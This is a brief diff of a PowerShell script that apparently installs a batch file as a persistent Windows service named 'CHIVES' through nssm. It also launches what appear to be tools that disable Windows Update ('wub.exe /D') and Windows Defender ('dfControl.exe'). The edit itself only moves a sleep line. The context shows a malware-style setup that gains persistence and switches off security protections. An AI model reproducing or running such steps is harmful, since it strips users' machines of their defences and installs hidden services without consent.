@@ -15,8 +15,8 @@ pause
 "@
 $batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
 New-Item -Path "$env:USERPROFILE\Desktop\Service_OK.dat" -ItemType File
-Start-Sleep -Seconds 2
 Start-Process -FilePath "nssm.exe" -ArgumentList "install CHIVES `"$folderPath\van.bat`""
+Start-Sleep -Seconds 2
 Start-Sleep -Seconds 1
 Start-Process -FilePath "wub.exe" -ArgumentList "/D"
 Start-Process -FilePath "dfControl.exe"
